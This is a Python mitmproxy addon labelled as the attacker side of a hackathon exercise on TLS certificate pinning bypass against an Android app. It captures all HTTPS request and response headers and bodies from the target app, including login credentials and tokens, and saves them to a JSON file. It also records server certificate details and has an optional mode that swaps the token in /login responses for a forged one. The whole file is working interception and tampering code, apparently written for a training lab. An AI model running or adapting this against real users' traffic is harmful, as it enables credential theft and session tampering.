"""
=============================================================
  TLS MitM Intercept Addon  —  Attacker Side
  Hackathon #31: TLS Certificate Pinning Bypass & MitM Attack
  MITRE ATT&CK: T1557 (AitM), T1040 (Network Sniffing)
=============================================================

PURPOSE:
  mitmproxy addon that intercepts, logs, and optionally modifies
  HTTPS traffic from the target Android application.

USAGE:
  mitmproxy -s intercept_addon.py --ssl-insecure -p 8080
  mitmdump  -s intercept_addon.py --ssl-insecure -p 8080   (headless)

The --ssl-insecure flag tells mitmproxy to NOT verify upstream
server certs — required because the backend uses a self-signed cert.
"""

import json
import datetime
import base64
import hashlib
import os
from mitmproxy import http, ctx
from mitmproxy.net.http import http1


# ── Config ─────────────────────────────────────────────────
LOG_FILE    = "intercepted_traffic.json"
INJECT_MODE = False   # Set True to enable response tampering demo
TARGET_HOST = "10.0.2.2"   # Android emulator loopback → host machine
# ────────────────────────────────────────────────────────────

captured = []


def _ts() -> str:
    return datetime.datetime.utcnow().isoformat() + "Z"


def _fingerprint(cert) -> str:
    """Return SHA-256 fingerprint of server certificate public key (base64)."""
    try:
        der = cert.get_pubkey().exportKey("DER")
        digest = hashlib.sha256(der).digest()
        return "sha256/" + base64.b64encode(digest).decode()
    except Exception:
        return "N/A"


# ── mitmproxy hooks ─────────────────────────────────────────

def request(flow: http.HTTPFlow) -> None:
    """Fires when a full request has been read from the client."""
    ctx.log.info(f"[INTERCEPT] ▶ {flow.request.method} {flow.request.pretty_url}")

    entry = {
        "timestamp"   : _ts(),
        "direction"   : "REQUEST",
        "method"      : flow.request.method,
        "url"         : flow.request.pretty_url,
        "host"        : flow.request.host,
        "port"        : flow.request.port,
        "path"        : flow.request.path,
        "http_version": flow.request.http_version,
        "headers"     : dict(flow.request.headers),
        "body"        : flow.request.get_text(strict=False) or "",
    }
    captured.append(entry)
    _pretty_print_request(entry)


def response(flow: http.HTTPFlow) -> None:
    """Fires when a full response has been read from the server."""
    ctx.log.info(
        f"[INTERCEPT] ◀ {flow.response.status_code} "
        f"{flow.request.pretty_url}"
    )

    # --- Certificate intelligence ---
    cert_info = {}
    if flow.server_conn and flow.server_conn.certificate_list:
        cert = flow.server_conn.certificate_list[0]
        try:
            cert_info = {
                "subject"    : str(cert.cn),
                "issuer"     : str(cert.issuer),
                "serial"     : str(cert.serial),
                "not_before" : str(cert.notbefore),
                "not_after"  : str(cert.notafter),
                "san"        : str(cert.altnames),
            }
        except Exception as ex:
            cert_info = {"parse_error": str(ex)}

    entry = {
        "timestamp"    : _ts(),
        "direction"    : "RESPONSE",
        "url"          : flow.request.pretty_url,
        "status_code"  : flow.response.status_code,
        "reason"       : flow.response.reason,
        "headers"      : dict(flow.response.headers),
        "body"         : flow.response.get_text(strict=False) or "",
        "cert_info"    : cert_info,
    }
    captured.append(entry)
    _pretty_print_response(entry)

    # ── DEMO: Response Tampering ────────────────────────────
    # When INJECT_MODE is True we rewrite the JSON body returned
    # by /login so the token is replaced with our forged value.
    if INJECT_MODE and flow.request.path == "/login":
        try:
            original = json.loads(flow.response.get_text())
            ctx.log.warn("[TAMPER] Intercepted /login — injecting forged token!")
            original["token"]    = "ATTACKER-FORGED-TOKEN-evil0000"
            original["_injected"] = True
            flow.response.set_text(json.dumps(original))
            ctx.log.warn(f"[TAMPER] New body → {json.dumps(original)}")
        except json.JSONDecodeError:
            pass  # not JSON, skip

    _flush_log()


def tls_established_client(data) -> None:
    """Fires after TLS handshake with the client (Android app) is done."""
    ctx.log.info("[TLS] ✓ TLS handshake with client complete")


def tls_established_server(data) -> None:
    """Fires after TLS handshake with the upstream server is done."""
    ctx.log.info("[TLS] ✓ TLS handshake with server complete (MitM in place)")


# ── Helpers ────────────────────────────────────────────────

def _pretty_print_request(e: dict) -> None:
    ctx.log.info("=" * 60)
    ctx.log.info(f"  REQUEST  {e['method']} {e['url']}")
    for k, v in e["headers"].items():
        ctx.log.info(f"  {k}: {v}")
    if e["body"]:
        ctx.log.info(f"  BODY: {e['body'][:500]}")


def _pretty_print_response(e: dict) -> None:
    ctx.log.info("-" * 60)
    ctx.log.info(f"  RESPONSE {e['status_code']} {e['reason']}  ← {e['url']}")
    if e["body"]:
        ctx.log.info(f"  BODY: {e['body'][:1000]}")
    if e["cert_info"]:
        ctx.log.info(f"  CERT CN: {e['cert_info'].get('subject')}")


def _flush_log() -> None:
    """Persist all captured traffic to JSON file."""
    with open(LOG_FILE, "w") as f:
        json.dump(captured, f, indent=2, default=str)
